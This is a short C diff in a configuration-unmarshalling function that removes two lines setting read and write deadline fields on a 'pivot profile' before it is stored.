@@ -1230,8 +1230,6 @@ PGLOBAL_CONFIG UnmarshalConfig
 						FreeBuffer(pTemp2[0]);
 					}
 
-					pPivotProfile->dwReadDeadline = pTemp2[1];
-					pPivotProfile->dwWriteDeadline = pTemp2[2];
 					pResult->PivotProfiles[i] = pPivotProfile;
 					FREE(pTemp2);
 				}
